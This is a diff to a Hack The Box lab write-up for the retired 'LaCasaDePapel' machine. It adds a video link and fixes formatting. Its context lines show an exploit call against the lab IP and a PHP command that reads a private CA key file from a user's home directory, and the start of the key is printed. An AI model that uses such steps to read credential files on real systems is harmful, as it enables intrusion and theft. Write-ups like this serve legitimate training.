@@ -11,6 +11,11 @@ To fill in later
 
 # HTB retired machines - LaCasaDePapel
 
+## Video
+
+[![](https://mrjak3.github.io/assets/img/lacasa_logo.png)(https://www.youtube.com/watch?v=OSRCEOQQJ4E)]
+
+
 ## Summary
 
 Fill out later
@@ -110,12 +115,13 @@ exploit("10.10.10.131", 21)
 
 ### 5.5 Let's inspect each one of them. After some enumeration we see `ca.key` in ``/home/nairobi`
 
-##6.0 Private key CA certificates
+## 6.0 Private key CA certificates
 
 ### 6.1 Lets read its contents and copy it into a file
 
-```python
+```
 echo file_get_contents("/home/nairobi/ca.key")
+
 -----BEGIN PRIVATE KEY-----
 MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb
 7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/
